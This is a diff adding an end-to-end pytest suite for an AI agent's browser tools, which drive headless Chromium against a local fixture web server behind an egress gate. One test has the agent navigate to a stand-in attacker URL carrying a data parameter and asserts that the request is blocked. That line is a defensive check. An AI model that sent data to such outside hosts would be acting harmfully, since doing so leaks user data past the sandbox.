@@ -1,0 +1,265 @@
+"""Browser tool bundle — end-to-end through the real host stack.
+
+Each test drives the actual path an agent would take: tool call →
+DevServerManager launches the user-declared service (python http.server on a
+static fixture) inside a trial-shaped worktree → BrowserSession opens it in
+headless Chromium behind the egress gate.
+"""
+
+from __future__ import annotations
+
+import re
+import sys
+from collections.abc import AsyncIterator
+from pathlib import Path
+from typing import Any
+
+import pytest
+
+from yukar.agents.context import AgentContext
+from yukar.agents.tools.browser_tools import (
+    make_browser_tools,
+    make_browser_tools_if_configured,
+)
+from yukar.models.project import (
+    DevServerConfig,
+    DevService,
+    Project,
+    Repo,
+    ServiceReadiness,
+)
+from yukar.preview.browser import (
+    BrowserSessionManager,
+    init_browser_session_manager,
+)
+from yukar.preview.manager import (
+    DevServerManager,
+    init_dev_server_manager,
+)
+from yukar.storage.project_repo import save_project, save_repo
+
+_INDEX_HTML = """<!DOCTYPE html>
+<html><head><title>Fixture App</title></head>
+<body>
+  <h1>Hello Yukar</h1>
+  <a href="/page2.html">Go to page 2</a>
+  <form>
+    <input type="text" placeholder="Search box">
+    <button type="button">Do it</button>
+  </form>
+  <script>console.log('hello-from-page');</script>
+</body></html>
+"""
+
+_PAGE2_HTML = (
+    "<!DOCTYPE html><html><head><title>Page Two</title></head>"
+    "<body><h1>Second</h1></body></html>"
+)
+
+
+def _dev_server_config() -> DevServerConfig:
+    return DevServerConfig(
+        services=[
+            DevService(
+                name="web",
+                command=[sys.executable, "-m", "http.server", "{port}", "--bind", "127.0.0.1"],
+                base_port=43100,
+                readiness=ServiceReadiness(path="/", timeout_seconds=30),
+            )
+        ]
+    )
+
+
+@pytest.fixture
+async def managers() -> AsyncIterator[tuple[DevServerManager, BrowserSessionManager]]:
+    """Install fresh process singletons; tear everything down after the test."""
+    dev = DevServerManager()
+    sessions = BrowserSessionManager()
+    init_dev_server_manager(dev)
+    init_browser_session_manager(sessions)
+    try:
+        yield dev, sessions
+    finally:
+        await sessions.close_all()
+        await dev.stop_all()
+        init_dev_server_manager(None)
+        init_browser_session_manager(None)
+
+
+@pytest.fixture
+async def ctx(tmp_path: Path) -> AgentContext:
+    """Trial-shaped worktree (…/worktrees/t1/app) with fixture pages + repo YAML."""
+    root = str(tmp_path / "workspace")
+    worktree = tmp_path / "worktrees" / "t1" / "app"
+    worktree.mkdir(parents=True)
+    (worktree / "index.html").write_text(_INDEX_HTML)
+    (worktree / "page2.html").write_text(_PAGE2_HTML)
+
+    await save_project(root, Project(id="p", name="p", repos=["app"]))
+    await save_repo(
+        root,
+        "p",
+        Repo(name="app", path=str(worktree), dev_server=_dev_server_config()),
+    )
+    return AgentContext(
+        project_id="p",
+        epic_id="e1",
+        repo_name="app",
+        worktree_path=worktree,
+        workspace_root=root,
+    )
+
+
+def _tools_by_name(tools: list[Any]) -> dict[str, Any]:
+    return {t.tool_name: t for t in tools}
+
+
+def _text_of(result: dict[str, Any]) -> str:
+    return "\n".join(block.get("text", "") for block in result.get("content", []))
+
+
+def _ref_of(snapshot_text: str, pattern: str) -> str:
+    match = re.search(pattern + r".*?\[ref=(e\d+)\]", snapshot_text)
+    assert match is not None, f"pattern {pattern!r} not found in:\n{snapshot_text}"
+    return match.group(1)
+
+
+class TestBundleGating:
+    async def test_no_config_no_tools(self, tmp_path: Path, managers: Any) -> None:
+        root = str(tmp_path / "ws2")
+        worktree = tmp_path / "worktrees" / "t1" / "bare"
+        worktree.mkdir(parents=True)
+        await save_project(root, Project(id="p", name="p", repos=["bare"]))
+        await save_repo(root, "p", Repo(name="bare", path=str(worktree)))
+        ctx = AgentContext(
+            project_id="p",
+            epic_id="e1",
+            repo_name="bare",
+            worktree_path=worktree,
+            workspace_root=root,
+        )
+        assert await make_browser_tools_if_configured(ctx, "worker-1") == []
+
+    async def test_configured_repo_gets_bundle(self, ctx: AgentContext, managers: Any) -> None:
+        tools = await make_browser_tools_if_configured(ctx, "worker-1")
+        names = set(_tools_by_name(tools))
+        assert {
+            "browser_open",
+            "browser_navigate",
+            "browser_read",
+            "browser_click",
+            "browser_type",
+            "browser_press",
+            "browser_screenshot",
+            "browser_console",
+            "server_logs",
+            "server_stop",
+        } <= names
+
+    def test_uninitialised_singletons_yield_no_tools(self, tmp_path: Path) -> None:
+        # No `managers` fixture — singletons are absent in this process state.
+        init_dev_server_manager(None)
+        init_browser_session_manager(None)
+        worktree = tmp_path / "worktrees" / "t1" / "app"
+        worktree.mkdir(parents=True)
+        ctx = AgentContext(
+            project_id="p",
+            epic_id="e1",
+            repo_name="app",
+            worktree_path=worktree,
+            workspace_root=str(tmp_path),
+        )
+        assert make_browser_tools(ctx, "worker-1") == []
+
+
+class TestBrowserFlow:
+    async def test_open_read_click_type_screenshot(
+        self, ctx: AgentContext, managers: Any
+    ) -> None:
+        tools = _tools_by_name(make_browser_tools(ctx, "worker-1"))
+
+        opened = await tools["browser_open"]()
+        assert opened["status"] == "success", _text_of(opened)
+        text = _text_of(opened)
+        assert "Fixture App" in text
+        assert 'heading "Hello Yukar"' in text
+
+        # Click through to page 2 via its snapshot ref.
+        link_ref = _ref_of(text, r'link "Go to page 2"')
+        clicked = await tools["browser_click"](ref=link_ref)
+        assert clicked["status"] == "success", _text_of(clicked)
+
+        read = await tools["browser_read"]()
+        assert "Page Two" in _text_of(read)
+
+        # Back to the form page; type into the search box.
+        navigated = await tools["browser_navigate"](url="/index.html")
+        assert navigated["status"] == "success", _text_of(navigated)
+        box_ref = _ref_of(_text_of(navigated), r'textbox "Search box"')
+        typed = await tools["browser_type"](ref=box_ref, text="hello")
+        assert typed["status"] == "success", _text_of(typed)
+
+        shot = await tools["browser_screenshot"]()
+        assert shot["status"] == "success"
+        image = shot["content"][1]["image"]
+        assert image["format"] == "jpeg"
+        assert image["source"]["bytes"][:2] == b"\xff\xd8"  # JPEG magic
+
+        console = await tools["browser_console"]()
+        assert "hello-from-page" in _text_of(console)
+
+        logs = await tools["server_logs"]()
+        assert logs["status"] == "success"
+
+    async def test_stale_ref_reports_error(self, ctx: AgentContext, managers: Any) -> None:
+        tools = _tools_by_name(make_browser_tools(ctx, "worker-1"))
+        opened = await tools["browser_open"]()
+        assert opened["status"] == "success", _text_of(opened)
+
+        result = await tools["browser_click"](ref="e9999")
+        assert result["status"] == "error"
+        assert "stale" in _text_of(result)
+
+    async def test_navigate_outside_origins_blocked(
+        self, ctx: AgentContext, managers: Any
+    ) -> None:
+        tools = _tools_by_name(make_browser_tools(ctx, "worker-1"))
+        opened = await tools["browser_open"]()
+        assert opened["status"] == "success", _text_of(opened)
+
+        result = await tools["browser_navigate"](url="https://attacker.example/?d=x")
+        assert result["status"] == "error"
+        assert "blocked" in _text_of(result).lower()
+
+    async def test_tools_before_open_report_error(
+        self, ctx: AgentContext, managers: Any
+    ) -> None:
+        tools = _tools_by_name(make_browser_tools(ctx, "worker-1"))
+        result = await tools["browser_read"]()
+        assert result["status"] == "error"
+        assert "browser_open" in _text_of(result)
+
+    async def test_unknown_service_rejected(self, ctx: AgentContext, managers: Any) -> None:
+        tools = _tools_by_name(make_browser_tools(ctx, "worker-1"))
+        result = await tools["browser_open"](service="ghost")
+        assert result["status"] == "error"
+        assert "Unknown service" in _text_of(result)
+
+    async def test_server_stop_idempotent(self, ctx: AgentContext, managers: Any) -> None:
+        dev, _sessions = managers
+        tools = _tools_by_name(make_browser_tools(ctx, "worker-1"))
+        opened = await tools["browser_open"]()
+        assert opened["status"] == "success", _text_of(opened)
+
+        stopped = await tools["server_stop"]()
+        assert stopped["status"] == "success"
+        assert "stopped" in _text_of(stopped)
+
+        # Registry is empty for this trial and a second stop is a no-op.
+        again = await tools["server_stop"]()
+        assert again["status"] == "success"
+        assert "No dev server" in _text_of(again)
+
+        # Re-open works after an explicit stop.
+        reopened = await tools["browser_open"]()
+        assert reopened["status"] == "success", _text_of(reopened)
